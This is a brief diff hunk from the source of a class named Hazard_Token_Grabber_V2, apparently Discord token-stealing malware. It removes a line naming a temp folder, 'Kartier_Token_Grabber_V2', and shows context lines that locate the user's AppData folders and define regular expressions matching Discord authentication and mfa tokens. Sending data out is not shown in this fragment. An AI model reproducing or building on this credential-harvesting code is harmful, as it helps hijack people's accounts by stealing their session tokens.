@@ -19,7 +19,6 @@ class Hazard_Token_Grabber_V2:
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = os.getenv("temp")+"\\Kartier_Token_Grabber_V2"
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
 
         try:
